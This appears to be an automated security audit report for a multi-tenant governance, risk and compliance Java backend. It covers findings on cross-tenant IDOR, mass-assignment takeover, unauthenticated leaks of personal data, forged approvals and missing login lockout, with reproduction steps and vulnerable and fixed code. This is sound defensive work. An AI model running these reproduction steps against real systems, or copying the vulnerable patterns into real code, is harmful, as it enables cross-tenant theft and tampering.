CriticalSEC-CYB-001Cross-tenant read/update/delete (IDOR) across all CyberService single-entity operations
✓ VerifiedSecurityBroken Access Control / IDOR (A01)▾
Adversarial verification: confirmed — Confirmed real cross-tenant IDOR. CyberService.getControl(id) (line 184), updateControl(id,req) (199) and deleteControl(id) (210) resolve the entity via controlRepo.findById(id) with NO organisation scoping. The controller (CyberController lines 85-108) passes only the path id — no orgId — to these methods. The @PreAuthorize("hasPermission('CYBER','READ'/'WRITE')") checks only the action permission, NOT object ownership, so a user holding CYBER perms in tenant A can read/update/soft-delete tenant B's CyberControl by guessing/iterating ids. updateControl preserves existing.getOrganisationId(), but 'existing' itself came from the unscoped findById, so the write still lands on the foreign row. No mitigating org-scoped guard exists anywhere in the path. Same unscoped findById pattern repeats for sub-controls/assessments/vulnerabilities/etc. Critical stands.
Location tss-grc-backend/src/main/java/com/tss/grc/module/cyber/service/CyberService.java:183-214 Effort M Risk CVSS 9.1 (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) — authenticated cross-tenant read, modify and delete of another organisation's cyber records
tss-grc-backend/src/main/java/com/tss/grc/module/cyber/service/CyberService.java:269-329
tss-grc-backend/src/main/java/com/tss/grc/module/cyber/service/CyberService.java:340-381
tss-grc-backend/src/main/java/com/tss/grc/module/cyber/service/CyberService.java:399-482
tss-grc-backend/src/main/java/com/tss/grc/module/cyber/service/CyberService.java:508-612
tss-grc-backend/src/main/java/com/tss/grc/module/cyber/controller/CyberController.java:85-101

Description

Every single-entity operation in CyberService — getControl, updateControl, deleteControl, getSubControl path, getAssessment/updateAssessment/approveAssessment/convertGapToCapa/deleteAssessment, getVulnerability/updateVulnerability/escalate/deleteVulnerability, approveException/updateException/deleteException, getIncident/updateIncident/startResponse/deleteIncident, updateAsset/deleteAsset, updateEvidence/deleteEvidence, getActionPlan/updateActionPlan/completeActionPlan/deleteActionPlan — resolves the target entity with the bare JPA primary-key lookup repo.findById(id), which is NOT scoped by organisation_id. The TenantContext orgId is never consulted on these paths. The repositories already expose org-scoped finders (e.g. CyberControlRepository.findByOrganisationId), so the unscoped lookups are an oversight, not a missing capability. The CyberController @PreAuthorize guards only check the caller holds CYBER:READ/WRITE in their own tenant; they do not bind the path id to that tenant. Because primary keys are sequential Long values, any authenticated user with CYBER permissions can enumerate ids and read, modify, approve, escalate, or soft-delete cyber controls, assessments, vulnerabilities, incidents, assets, evidence and action plans belonging to ANY other tenant.

Root cause

Service-layer reads/writes use Spring Data's unscoped findById(id) instead of an org-scoped finder (findByIdAndOrganisationId / findByOrganisationIdAndId). The platform relies on per-query org scoping (no global Hibernate tenant filter — see TenantContext javadoc), and this is the developer's responsibility per query; it was omitted on every single-id path in CyberService.

Evidence / proof
    @Transactional(readOnly = true)
    public CyberControl getControl(Long id) {
        return controlRepo.findById(id)
                .orElseThrow(() -> new EntityNotFoundException("CyberControl not found: " + id));
    }
    ...
    @Transactional
    public void deleteControl(Long id) {
        CyberControl c = getControl(id);   // unscoped — any tenant's id resolves
        c.setIsDeleted(true);
        controlRepo.save(c);
    }

Real-world impact

Full cross-tenant compromise of the Cyber module. A user in tenant A (e.g. STC Bank demo, org 3) can read tenant B's (e.g. the Saudi bank, org 1) cyber-incident details, vulnerability inventory with CVE/asset mappings, control-assessment gaps and evidence, then tamper with them: silently soft-delete another bank's open critical incidents, approve their own forged assessments, escalate/close vulnerabilities, or complete action plans — destroying audit/compliance integrity (NCA ECC, SAMA CSF) and exposing confidential security posture of every other tenant.

Reproduction

1. Log in as a low-tenant user holding CYBER:READ/WRITE (e.g. riskmanager) in org A; capture Bearer token.
2. Note that ids are sequential. GET /api/v1/cyber/incidents/{id} iterating id=1..N returns 200 with another tenant's CyberIncident JSON (confirmed: findById ignores org; EntityNotFoundException only when the row truly does not exist).
3. DELETE /api/v1/cyber/incidents/{id} on a foreign-tenant id returns 204 and soft-deletes the victim tenant's incident.
4. POST /api/v1/cyber/assessments/{id}/approve on a foreign id flips another tenant's assessment to APPROVED.

Resolution

Add org-scoped finders to every cyber repository (e.g. Optional<CyberControl> findByIdAndOrganisationId(Long id, Long orgId)) and change every single-id service method to load via the current TenantContext org, throwing EntityNotFoundException when the row is not owned by the caller's tenant. Pass orgId from the controller (it already calls orgId()) into the get/update/delete/workflow methods. Prefer TenantContext.requireOrganisationId() (fail-fast) as the cyber_lc module already does.

▼ Before (vulnerable)
@Transactional(readOnly = true)
public CyberControl getControl(Long id) {
    return controlRepo.findById(id)
            .orElseThrow(() -> new EntityNotFoundException("CyberControl not found: " + id));
}
▲ After (fixed)
@Transactional(readOnly = true)
public CyberControl getControl(Long id) {
    Long orgId = TenantContext.requireOrganisationId();
    return controlRepo.findByIdAndOrganisationId(id, orgId)
            .orElseThrow(() -> new EntityNotFoundException("CyberControl not found: " + id));
}
// repository:
// Optional<CyberControl> findByIdAndOrganisationId(Long id, Long organisationId);

CriticalSEC-CYB-002Cross-tenant row overwrite/takeover via client-supplied id on entity-bodied write endpoints (mass assignment)
✓ VerifiedSecurityBroken Access Control / Mass Assignment (A01/A08)▾
Adversarial verification: confirmed — Confirmed cross-tenant mass-assignment takeover. OtAssetService.save(in) (lines 38-70) calls repo.save(in) directly on the client-supplied detached entity, including the attacker-controlled in.getId(). The org-scoped findByIdAndOrganisationId at line 45 is used ONLY to snapshot prior remote-access state and returns null for a foreign id — it does NOT block the write. Line 48 sets in.setOrganisationId(currentTenant), then repo.save(in) performs a merge/UPDATE on the foreign row id, overwriting all attacker-supplied fields AND reassigning the victim row to the attacker's tenant. The PUT path (OtAssetController line 41) explicitly body.setId(id), and @PreAuthorize only checks hasAnyRole(...), never object ownership. A privileged-enough user in tenant A overwrites/steals tenant B's OT assets. Critical stands.

Description

The SOC-Ops controllers bind the JPA @Entity directly from @RequestBody and pass it to a service save(in) that does in.setOrganisationId(currentTenant) then repo.save(in) WITHOUT first nulling the id or verifying that an existing row with in.getId() belongs to the caller's tenant. The PUT handlers explicitly do body.setId(id) from the path variable, and the POST/create handlers accept whatever id the client sends in the JSON body. Because in.getId() is non-null, Spring Data save() performs a Hibernate merge: it loads the persistent row by primary key alone (ignoring organisation_id), copies all client-supplied fields onto it, AND sets organisation_id to the attacker's tenant. The result is a cross-tenant overwrite that also re-parents the victim row into the attacker's org. The platform-wide backstop (TenantWriteGuardInterceptor) that would detect the organisation_id change is feature-flagged OFF by default (grc.security.tenant-write-guard.enabled=false, see TenantWriteGuardConfig) and is not enabled in any profile, so nothing prevents this at runtime. This pattern is repeated across nearly all SOC-Ops services (OtAsset, CryptoAsset, AppsecFinding[save], ForensicsArtefact, SbomComponent, PentestEngagement, IamJmlEvent, CyberInsurance, MaDueDiligence, RegulatorExamination, AwarenessCampaign, BrandMonitoring, ZtMaturity, SeasonalOverlay, ThreatIntel[update branch], DlpEvent). The same defect also exists in the main CyberService write methods that omit setId(null): saveAssessment, saveVulnerability, saveException, saveEvidence, saveActionPlan.

Root cause

save()/create() methods trust a client-controlled primary key and rely on Hibernate merge, which is keyed on PK only and never validates tenant ownership. The intended per-service mass-assignment defense (req.setId(null) on create) is applied inconsistently — present in saveFramework/saveControl/saveAsset/saveIncident but absent everywhere else — and the global TenantWriteGuardInterceptor that would catch the organisation_id mutation is disabled.

Evidence / proof
// OtAssetController.update
body.setId(id);            // path id, but service never checks ownership
return svc.save(body);

// OtAssetService.save
in.setOrganisationId(TenantContext.getCurrentTenant());
boolean isNew = in.getId() == null;
OtAsset saved = repo.save(in);   // merge by PK -> overwrites foreign-tenant row, reassigns org

Real-world impact

Any authenticated user holding the relevant SOC-Ops role (e.g. CISO/OT_LEAD) in tenant A can overwrite and seize a specific row owned by tenant B by issuing a write with that row's primary key. This corrupts another bank's OT/ICS asset register, cryptographic inventory, cyber-insurance policies, regulator-examination records, forensic chain-of-custody artefacts, etc., and silently moves those rows out of the victim tenant (data destruction + integrity loss). It defeats the entire multi-tenant isolation guarantee for writes.

Reproduction

1. As a CISO in org A, GET /api/v1/socops/ot-assets to learn id ranges (or simply enumerate).
2. Issue PUT /api/v1/socops/ot-assets/{idOwnedByOrgB} with a JSON body of attacker-chosen fields. The response is 200; the row formerly owned by org B is now overwritten and organisation_id is set to org A.
3. Alternatively POST /api/v1/socops/threat-intel with body {"id": <org-B id>, ...}: ThreatIntelService takes the in.getId()!=null branch and overwrites the foreign row.

Resolution

On create, always force in.setId(null) before save. On update, load the existing row scoped by tenant (repo.findByIdAndOrganisationId(id, currentTenant)) and copy only mutable fields onto the managed entity (never merge a detached, client-built entity). Reject the request with 404/403 if the scoped lookup misses. Additionally, enable the existing TenantWriteGuardInterceptor (grc.security.tenant-write-guard.enabled=true) as a defense-in-depth backstop after wrapping the legitimate cross-tenant sweeps in TenantContext.allowCrossTenantWrite().

▼ Before (vulnerable)
@Transactional
public OtAsset save(OtAsset in) {
    in.setOrganisationId(TenantContext.getCurrentTenant());
    boolean isNew = in.getId() == null;
    OtAsset saved = repo.save(in);   // cross-tenant merge
    ...
}
▲ After (fixed)
@Transactional
public OtAsset save(OtAsset in) {
    Long org = TenantContext.requireOrganisationId();
    OtAsset target;
    if (in.getId() == null) {
        target = in;                 // create
    } else {
        target = repo.findByIdAndOrganisationId(in.getId(), org)   // scoped load
            .orElseThrow(() -> new EntityNotFoundException("OtAsset " + in.getId()));
        copyMutableFields(in, target);          // never merge the detached body
    }
    target.setOrganisationId(org);
    return repo.save(target);
}

CriticalSEC-FIN-001Unauthenticated public intake case-tracker leaks full submitter PII and form payload across all tenants
✓ VerifiedSecurityBroken Access Control / Sensitive Data Exposure (A01/A02, CWE-639, CWE-359)▾
Adversarial verification: confirmed — Confirmed unauthenticated cross-tenant PII exposure. SecurityConfig line 93 explicitly permitAll() on GET /api/v1/intake/track/** (verified — no auth required). The IntakeController.track (lines 81-87) and IntakeService.findByReferenceCode (lines 143-146) look up by reference code with NO organisation_id filter (cross-tenant) and map straight to IntakeRecordDto.from(). That DTO mapper (IntakeRecordDto.from, lines 58-82) copies submitterName, submitterEmail, submitterPhone AND the full raw payload verbatim with ZERO redaction, regardless of submitterIsAnonymous. The controller/service docstrings claim 'PII fields are still filtered downstream when the submission was anonymous' — that claim is demonstrably false (no filtering code exists; contrast SecurityConfig's own note that the complaints public portal returns a 'PII-stripped view'). Reference codes are 8 chars from a 31-symbol alphabet with no rate-limiting on the unauthenticated endpoint. Genuine unauthenticated sensitive-data exposure across all tenants. Critical stands.

Description

GET /api/v1/intake/track/{referenceCode} is explicitly permitAll in SecurityConfig (line 93) and the controller method carries no @PreAuthorize. The service path findByReferenceCode -> IntakeRecordRepository.findByReferenceCode(referenceCode) is NOT scoped by organisationId, and the controller comment claims 'PII fields are still filtered downstream when the submission was anonymous'. No such filtering exists: IntakeRecordDto.from() copies the entire entity, including submitterName, submitterEmail, submitterPhone, and the raw payload JSON blob. Intake kinds include SPEAKUP, ETHICS_DISCLOSURE, PRIVACY_BREACH, DSR_REQUEST and BREACH_REPORT — the payload and submitter fields therefore contain whistleblower identities, data-subject PII and breach detail. Any anonymous internet caller who obtains/guesses a reference code for ANY tenant receives the full record. Reference codes are 8 random base-32 chars in two segments (XX-YYYY-ZZZZ), but they are shared with submitters over email, appear in logs, and the endpoint has no rate limiting, so they are enumerable/leakable bearer tokens guarding highly sensitive multi-tenant data.

Root cause

The 'reference code is the bearer token' design returns the full internal entity DTO with no field-level redaction and no organisation scoping, on a permitAll endpoint. The DTO mapper has no anonymous/public projection.

Evidence / proof
Controller: `@GetMapping("/track/{referenceCode}") public ResponseEntity<IntakeRecordDto> track(@PathVariable String referenceCode){ return service.findByReferenceCode(referenceCode).map(ResponseEntity::ok)...}` (no @PreAuthorize). Repo: `Optional<IntakeRecord> findByReferenceCode(String referenceCode);` (no org param). DTO: `IntakeRecordDto.from(r)` sets `.submitterName(r.getSubmitterName()).submitterEmail(r.getSubmitterEmail()).submitterPhone(r.getSubmitterPhone()).payload(r.getPayload())`.

Real-world impact

Unauthenticated disclosure of whistleblower identities, data-subject PII and breach narratives belonging to every tenant. Direct PDPL Article 20/transparency and SAMA/CMA confidential-reporting-channel violations; potential retaliation risk for whistleblowers.

Reproduction

1) Authenticated user (any tenant) submits an intake; capture the returned referenceCode (or read one from an email/log). 2) Without any token: curl https://host/api/v1/intake/track/SU-AB12-CD34 . 3) Response includes submitterName, submitterEmail, submitterPhone and the full payload JSON, regardless of which tenant owns the record and regardless of submitterIsAnonymous.

Resolution

Return a minimal public projection (status, kind, acknowledgedAt, slaDueAt, referenceCode only) — never submitter identity or payload. Strip PII unconditionally for the public endpoint, and especially when submitterIsAnonymous is true. Add rate limiting / lockout on the track endpoint. Consider requiring a second factor (e.g. email confirmation) before returning even status.

▼ Before (vulnerable)
@GetMapping("/track/{referenceCode}")
public ResponseEntity<IntakeRecordDto> track(@PathVariable String referenceCode) {
    return service.findByReferenceCode(referenceCode)
        .map(ResponseEntity::ok)
        .orElseGet(() -> ResponseEntity.notFound().build());
}
▲ After (fixed)
@GetMapping("/track/{referenceCode}")
public ResponseEntity<IntakeTrackingDto> track(@PathVariable String referenceCode) {
    // public projection only: status + timestamps, NO submitter PII, NO payload
    return service.findPublicStatusByReferenceCode(referenceCode)
        .map(ResponseEntity::ok)
        .orElseGet(() -> ResponseEntity.notFound().build());
}

// service:
public Optional<IntakeTrackingDto> findPublicStatusByReferenceCode(String code) {
    return repo.findByReferenceCode(code).map(r -> new IntakeTrackingDto(
        r.getReferenceCode(), r.getKind(), r.getStatus(),
        r.getAcknowledgedAt(), r.getSlaDueAt()));
}

CriticalSEC-IAM-001Approval-chain actor identity taken from request body — any authenticated user can forge approvals and advance/finalise chains
✓ VerifiedSecurityBroken Access Control / Broken Function Level Authorization (A01)▾
Adversarial verification: confirmed — Confirmed. POST /api/v1/workflow/chains/{id}/actions (ApprovalChainController:129-134) and /withdraw (136-141) are guarded only by @PreAuthorize("isAuthenticated()"). The actor identity is taken entirely from the request body: ApprovalChainInstanceService.recordAction writes a.setActorUserId(req.actorUserId()) (line 245) and audit-logs "by user="+req.actorUserId() with no comparison to SecurityContextHolder's principal, and no check that the caller matches the step's requiredUserId/requiredRole. The state machine advances purely on the existence of an APPROVED action row for a mandatory step (isStepOrderSatisfied, lines 401-412), so any authenticated user can forge approvals on behalf of any actorUserId and advance/finalise a chain. withdraw() compares originatorUserId to the body's actorUserId, which is attacker-controlled, so the originator-only guard is trivially satisfiable. loadOrThrow() org-scopes the instance, so this is intra-tenant only — but it fully defeats approval segregation-of-duties and forges the approval audit trail on a governance workflow. Critical is warranted (broken function-level authorization + signer/actor identity forgery).

Description

The endpoints POST /api/v1/workflow/chains/{id}/actions (recordAction) and POST /api/v1/workflow/chains/{id}/withdraw are guarded only by @PreAuthorize("isAuthenticated()"). The acting identity is read entirely from the request body field actorUserId (InstanceActionRequest.actorUserId / InstanceWithdrawRequest.actorUserId), NOT from the authenticated principal (Authentication / GrcUserDetails). The service never verifies that the caller actually IS actorUserId, nor that the caller satisfies the step's requiredUserId/requiredRole. resolveStepForActor() falls back to rows.get(0) when no user matches (line 444), so a caller who matches no step at all still gets a valid step row and their APPROVED action is counted by isStepOrderSatisfied(). Because recordAction can drive the state machine to APPROVED (lines 277-296) including final completion, any authenticated low-privilege user can push a board/risk/policy approval chain to a COMPLETED/APPROVED state on behalf of someone else. withdraw only checks Objects.equals(i.getOriginatorUserId(), req.actorUserId()) (line 317) — but actorUserId is attacker-supplied, so anyone can satisfy it by sending the originator's id. The instance lookup IS tenant-scoped (loadOrThrow -> findByOrganisationIdAndIdAndIsDeletedFalse), so this is a same-tenant BFLA / approval-forgery issue, not cross-tenant.

Root cause

Acting identity is trusted from client input instead of being derived from the security context, and the authorization check (isAuthenticated) does not enforce that the caller matches the step's required actor/role.

Evidence / proof
Controller: @PostMapping("/{id}/actions") @PreAuthorize("isAuthenticated()") public InstanceResponse recordAction(@PathVariable Long id, @RequestBody @Valid InstanceActionRequest req) { return instanceService.recordAction(id, req); }  // Service uses req.actorUserId() with no principal cross-check; resolveStepForActor: "return rows.get(0);" when no requiredUserId match.

Real-world impact

Forged approvals on governance/risk/compliance approval chains. An ordinary authenticated user can self-approve their own submission, approve on behalf of a CISO/DPO/board member, complete an entire multi-step chain, or withdraw another user's in-flight chain. The audit log and emitted DomainEvents record the attacker-chosen actorUserId, so the forged decision is attributed to an innocent user — defeating the non-repudiation the approval chain exists to provide.

Reproduction

1. Log in as any low-privilege user (e.g. AUDITOR). 2. GET /api/v1/workflow/chains to find an in-progress instance {id} and its currentStepOrder. 3. POST /api/v1/workflow/chains/{id}/actions with body {"stepOrder": <current>, "actorUserId": <CISO user id>, "action": "APPROVED"}. 4. Observe the chain advances / completes and the audit row reads 'action=APPROVED by user=<CISO id>'. 5. To cancel someone else's chain: POST /api/v1/workflow/chains/{id}/withdraw with {"actorUserId": <originator id>, "reasonEn": "x"}.

Resolution

Derive the acting user id from the authenticated principal (GrcUserDetails.getUserId()) in the controller and pass it to the service; ignore/reject any client-supplied actorUserId. In recordAction, require that the resolved principal matches the target step's requiredUserId OR holds requiredRole (reuse matchesActor); throw 403 otherwise instead of defaulting to rows.get(0). In withdraw, compare originatorUserId against the principal id, not a body field.

▼ Before (vulnerable)
@PostMapping("/{id}/actions")
@PreAuthorize("isAuthenticated()")
public InstanceResponse recordAction(@PathVariable Long id,
                                     @RequestBody @Valid InstanceActionRequest req) {
    return instanceService.recordAction(id, req);
}
▲ After (fixed)
@PostMapping("/{id}/actions")
@PreAuthorize("isAuthenticated()")
public InstanceResponse recordAction(@PathVariable Long id,
                                     @RequestBody @Valid InstanceActionRequest req,
                                     @AuthenticationPrincipal GrcUserDetails me) {
    // Identity comes from the token, never from the body.
    return instanceService.recordAction(id, req, me.getUserId(), authorityRoles(me));
}
// service: resolve step strictly via matchesActor(target, callerUserId, callerRoles);
// if no step matches -> throw new AccessDeniedException("Not an assigned approver for this step");

HighSEC-AUTH-001No automatic account lockout or brute-force throttling on login
✓ VerifiedSecurityIdentification and Authentication Failures (A07) / CWE-307▾
Adversarial verification: confirmed — Confirmed. AuthController.login (56-119) calls authManager.authenticate and on AuthenticationException simply returns 401 with no counting, throttling, or lockout. The User entity carries failedLoginAttempts and lockedUntil fields and GrcUserDetails exposes accountNonLocked, but a project-wide search of src/main shows NO code increments failedLoginAttempts, sets lockedUntil, or reads the application-dev.yml keys max-failed-login-attempts:99 / lockout-duration-minutes:1. CustomUserDetailsService derives accountNonLocked solely from the static user.getIsLocked() flag (line 55), i.e. manual admin locking only. There is no automatic brute-force protection or rate limiting on login (CWE-307). High is appropriate for a missing-throttle on the credential endpoint.
Location tss-grc-backend/src/main/java/com/tss/grc/module/auth/AuthController.java:56-119 Effort M Risk CVSS ~7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) — unlimited online password guessing against any account, including admin
tss-grc-backend/src/main/java/com/tss/grc/module/iam/entity/User.java:47-54
tss-grc-backend/src/main/java/com/tss/grc/module/iam/service/CustomUserDetailsService.java:41-58
tss-grc-backend/src/main/resources/application.yml:149-150
tss-grc-backend/src/main/resources/application-prod.yml:109-110

Description

The login flow authenticates via AuthenticationManager.authenticate(...) and, on success, returns tokens. The User entity defines failed_login_attempts, locked_until and is_locked columns, and every profile defines grc.security.max-failed-login-attempts / lockout-duration-minutes (prod uses max-login-attempts). However, NO Java code ever reads those properties, increments failedLoginAttempts, sets lockedUntil, or flips isLocked on repeated failures, and there is no AuthenticationFailure event listener and no rate-limiting filter on /api/auth/login. A grep for setFailedLoginAttempts / setLockedUntil / AuthenticationFailureBadCredentialsEvent across src/main/java returns no matches; the lockout property keys are referenced nowhere in Java. The only lockout signal that reaches Spring Security is accountNonLocked, derived from the static is_locked boolean (CustomUserDetailsService line 55), which can only be toggled manually by an administrator. Consequently an attacker can submit unlimited password guesses against any username with no slowdown, no lockout, and no captcha. (Note: the dev profile intentionally sets max-failed-login-attempts=99 / lockout=1min, but even that value is never consumed.)

Root cause

The data model and configuration for lockout were scaffolded (User.failedLoginAttempts/lockedUntil, grc.security.* keys) but the enforcement logic — a failure/success event listener that updates the counter and locks the account, plus a request throttle on the login endpoint — was never implemented.

Evidence / proof
AuthController.login(): catch (AuthenticationException ex) { return ResponseEntity.status(401).body(Map.of("message", "Invalid username or password")); }  // no failure counter, no lockout. CustomUserDetailsService.buildUserDetails(): new GrcUserDetails(..., !Boolean.TRUE.equals(user.getIsLocked()), authorities)  // accountNonLocked driven only by the manual is_locked flag. grep setFailedLoginAttempts|setLockedUntil|AuthenticationFailureBadCredentialsEvent over src/main/java => No matches found.

Real-world impact

Online brute-force and credential-stuffing against any account (including the seeded PLATFORM_ADMIN `admin`) is unrestricted. With BCrypt cost 12 the per-guess server cost is high, but there is still no account-level or IP-level limit, so a determined attacker can run a slow-but-unbounded guessing campaign and a botnet can parallelise credential stuffing. Compromise of a PLATFORM_ADMIN grants full cross-tenant control.

Reproduction

1. POST /api/auth/login with {"username":"admin","password":"wrong-1"} → 401 "Invalid username or password". 2. Repeat 100+ times with different passwords. 3. Observe every attempt returns 401 with no lockout, no Retry-After, no captcha; failed_login_attempts in iam.users stays 0 and locked_until stays NULL. 4. The account is never locked regardless of failure count.

Resolution

Implement an AuthenticationFailureBadCredentialsEvent / AuthenticationSuccessEvent listener that increments User.failedLoginAttempts, sets lockedUntil = now + grc.security.lockout-duration-minutes once attempts >= grc.security.max-failed-login-attempts, and resets the counter + sets lastLoginAt on success. Make accountNonLocked also honour lockedUntil (lock if lockedUntil is in the future). Add per-IP/per-username rate limiting on /api/auth/login (e.g. Bucket4j or a Spring filter). Bind the existing grc.security.* keys via a @ConfigurationProperties bean and standardise the prod key name (max-login-attempts vs max-failed-login-attempts).

▼ Before (vulnerable)
@Override public boolean isAccountNonLocked() { return accountNonLocked; }
// CustomUserDetailsService:
!Boolean.TRUE.equals(user.getIsLocked())  // only the manual flag
// AuthController.login: catch (AuthenticationException ex) { return 401; }  // no counter
▲ After (fixed)
@Component @RequiredArgsConstructor
class LoginAttemptListener {
  private final UserRepository users;
  @Value("${grc.security.max-failed-login-attempts:5}") int max;
  @Value("${grc.security.lockout-duration-minutes:30}") long lockMin;
  @EventListener void onFailure(AuthenticationFailureBadCredentialsEvent e) {
    users.findByUsername(String.valueOf(e.getAuthentication().getName())).ifPresent(u -> {
      int n = (u.getFailedLoginAttempts()==null?0:u.getFailedLoginAttempts())+1;
      u.setFailedLoginAttempts(n);
      if (n >= max) u.setLockedUntil(LocalDateTime.now().plusMinutes(lockMin));
      users.save(u);
    });
  }
  @EventListener void onSuccess(AuthenticationSuccessEvent e) { /* reset counter + lastLoginAt */ }
}
// GrcUserDetails: isAccountNonLocked() returns accountNonLocked && (lockedUntil == null || lockedUntil.isBefore(now))

BiaRecordRepository exposes only findByProcessId / findByProcessIdIn with no organisation_id finder, and BiaRecord has no organisationId column. BcmService.updateBia (221-232) and deleteBia (235-237) resolve by raw biaRepo.findById / biaRepo.deleteById with zero org check; listBia(processId) (201-207) accepts an arbitrary processId and calls findByProcessId with no org filter; createBia doesn't set/validate org. The controller exposes GET /bia, PUT /bia/{id}, DELETE /bia/{id} (BcmController:147-171) guarded only by the generic hasPermission('BCM',...) module permission, which any BCM user in any tenant holds. A user in tenant A can read, overwrite, or hard-delete tenant B's BIA records by guessing ids (deleteBia is even a hard delete via deleteById). The service comment claiming tenant scoping is enforced 'at the BiaRecordRepository query layer' is false. High is correct.
Location tss-grc-backend/src/main/java/com/tss/grc/module/bcm/service/BcmService.java:200-237 Effort M Risk CVSS 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) — authenticated cross-tenant read AND write of Business Impact Analysis data
tss-grc-backend/src/main/java/com/tss/grc/module/bcm/repository/BiaRecordRepository.java:10-13
tss-grc-backend/src/main/java/com/tss/grc/module/bcm/controller/BcmController.java:147-171
tss-grc-backend/src/main/java/com/tss/grc/module/bcm/entity/BiaRecord.java:13-46

Description

The legacy BCM service handles BiaRecord (the bcm.bia_records table holding RTO/RPO/MTPD recovery objectives and overall impact classification) with NO tenant scoping at any of read, update, or delete. (1) listBia(processId) calls biaRepo.findByProcessId(processId, ...) directly with a caller-supplied processId and never checks that the process or the returned BIA rows belong to TenantContext's organisation. (2) updateBia(id, req) loads the row by biaRepo.findById(id) with no org filter, then mutates and saves it, AND copies req.getProcessId() onto it — allowing a tenant-A user to overwrite a tenant-B BIA and even re-point it to an arbitrary process. (3) deleteBia(id) calls biaRepo.deleteById(id) with no org filter and no soft-delete — a hard cross-tenant delete. The root enabler is that BiaRecordRepository exposes only findByProcessId / findByProcessIdIn / inherited findById/deleteById (no *OrganisationId finder), the BiaRecord entity has no organisationId column and no @Where soft-delete clause, and createBia() (line 216) never stamps an organisation at all. The endpoints (GET/PUT/DELETE /api/v1/bcm/bia) are reachable by any BCM:READ/WRITE/DELETE holder.

Root cause

BiaRecord was modelled as a child of CriticalProcess (tenant scoping intended to be 'inherited via the parent process link') but the service never actually resolves the parent process to enforce that link. The repository provides no organisation-scoped finder, so every code path that touches a BIA by id or processId is implicitly global.

Evidence / proof
BcmService.listBia: `if (processId != null) return biaRepo.findByProcessId(processId, Pageable.unpaged()).getContent();`  BcmService.updateBia: `BiaRecord existing = biaRepo.findById(id).orElseThrow(...); existing.setProcessId(req.getProcessId()); ... return biaRepo.save(existing);`  BcmService.deleteBia: `biaRepo.deleteById(id);`  Comment at line 211-215 explicitly admits 'BiaRecord doesn't carry an organisationId column directly ... the platform-wide tenant guarantee for this entity comes from the BiaRecordRepository query layer' — but the query layer provides no such guarantee.

Real-world impact

An authenticated user in tenant A (a Saudi bank) can enumerate processId values and read the recovery objectives and impact ratings of any other tenant on the platform (e.g. Aramco Trading, STC Bank), overwrite another tenant's BIA, or permanently delete it. BIA data is sensitive regulatory artefact (SAMA BCF / ISO 22301) and cross-tenant tampering corrupts a competitor's continuity posture and audit trail.

Reproduction

1. Log in as a BCM user in tenant A. 2. GET /api/v1/bcm/bia?processId=<id-belonging-to-tenant-B> → returns tenant B's BIA rows. 3. PUT /api/v1/bcm/bia/<biaId-of-tenant-B> with a body to overwrite RTO/MTPD → 200, tenant B's data mutated. 4. DELETE /api/v1/bcm/bia/<biaId-of-tenant-B> → 204, row hard-deleted from another tenant.

Resolution

Add an organisationId column to bia_records (or always resolve the parent CriticalProcess and enforce its org) and rewrite all three operations to be tenant-scoped: validate the parent process belongs to TenantContext.getCurrentTenant() on create/list, and load BIAs through an org-scoped finder before update/delete. Replace deleteById with a soft-delete that re-loads under the tenant filter.

▼ Before (vulnerable)
@Transactional(readOnly = true)
public List<BiaRecord> listBia(Long processId) {
    if (processId != null) return biaRepo.findByProcessId(processId, Pageable.unpaged()).getContent();
    ...
}
@Transactional
public BiaRecord updateBia(Long id, BiaRecord req) {
    BiaRecord existing = biaRepo.findById(id)
        .orElseThrow(() -> new EntityNotFoundException("BIA record not found: " + id));
    existing.setProcessId(req.getProcessId());
    ...
}
@Transactional
public void deleteBia(Long id) {
    biaRepo.deleteById(id);
}
▲ After (fixed)
private CriticalProcess requireOwnedProcess(Long processId) {
    return processRepo.findById(processId)
        .filter(p -> p.getOrganisationId().equals(TenantContext.getCurrentTenant()))
        .orElseThrow(() -> new EntityNotFoundException("Process not found: " + processId));
}
private BiaRecord requireOwnedBia(Long id) {
    BiaRecord b = biaRepo.findById(id)
        .orElseThrow(() -> new EntityNotFoundException("BIA record not found: " + id));
    requireOwnedProcess(b.getProcessId());   // throws if parent process is another tenant's
    return b;
}
@Transactional(readOnly = true)
public List<BiaRecord> listBia(Long processId) {
    if (processId != null) { requireOwnedProcess(processId); return biaRepo.findByProcessId(processId, Pageable.unpaged()).getContent(); }
    ...
}
@Transactional
public BiaRecord updateBia(Long id, BiaRecord req) {
    BiaRecord existing = requireOwnedBia(id);
    requireOwnedProcess(req.getProcessId());
    ...
}
@Transactional
public void deleteBia(Long id) {
    BiaRecord b = requireOwnedBia(id);
    b.setStatus("DELETED");   // or soft-delete flag once column exists
    biaRepo.save(b);
}

✓ VerifiedSecurityBroken Object Level / Tenant Isolation (A01) + Mass Assignment (CWE-915)▾
Adversarial verification: confirmed — Confirmed mass-assignment / cross-tenant overwrite. FrameworkAnchorController.addMapping (119-128) binds a raw PolicyFrameworkMapping via @RequestBody and sets body.setPolicyId(id) but never nulls body.getId(). PolicyFrameworkMapping has an IDENTITY id and no organisationId column, and requirePolicy() only org-scopes the path-variable policy, not the body's mapping id. If the caller supplies an existing mapping id, mappingRepo.save(body) becomes a JPA merge/UPDATE over that row — including a cross-tenant row, since mapping rows are unscoped — letting an authenticated COMPLIANCE:WRITE user clobber/hijack another tenant's policy_framework_mapping. The codebase's own BcmService.createPlan/createProcess explicitly null the id as a documented 'mass-assignment defense', confirming the omission here is a real defect. Requires the COMPLIANCE:WRITE permission, so High (not Critical) is the right severity.
Location tss-grc-backend/src/main/java/com/tss/grc/module/compliance/controller/FrameworkAnchorController.java:119-128 Effort S Risk CVSS 8.1 (AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:N) — authenticated tenant can mutate another tenant's mapping rows
tss-grc-backend/src/main/java/com/tss/grc/module/compliance/entity/PolicyFrameworkMapping.java:18-46
tss-grc-backend/src/main/java/com/tss/grc/module/compliance/repository/PolicyFrameworkMappingRepository.java:8-12

Description

